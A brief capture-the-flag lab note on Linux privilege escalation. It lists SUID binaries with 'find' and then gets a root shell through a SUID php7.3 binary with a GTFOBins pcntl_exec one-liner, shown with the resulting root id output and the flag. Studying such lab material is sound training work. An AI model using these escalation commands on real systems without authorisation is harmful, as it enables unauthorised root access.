---
aliases: 
tags:
  - tech
  - cybsec
  - penetration_testing
  - report
author: Mehdi N Tehrani
creat_date: 2023-12-06
category: Cyber Security
subcategory: Penetration Testing - Report
---

# Find what commands can be run as root
#suid
  ```
$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
```

# Rooted
#gtfobins
https://gtfobins.github.io/gtfobins/php/
```
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"

whoami
root
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

ls /root
flag.txt
cat /root/flag.txt
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
```

